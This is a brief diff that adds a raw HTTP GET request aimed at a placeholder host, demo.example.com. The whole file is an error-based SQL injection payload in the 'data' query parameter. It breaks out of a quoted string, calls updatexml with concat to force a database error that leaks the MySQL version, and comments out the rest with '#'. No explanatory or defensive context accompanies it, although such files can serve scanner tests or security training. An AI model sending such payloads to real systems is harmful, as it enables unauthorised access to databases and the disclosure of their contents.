@@ -1,0 +1,4 @@
+GET /a?data=x\u0027%20or%20updatexml(1,concat(0x7e,(select%20version())),1)%23 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
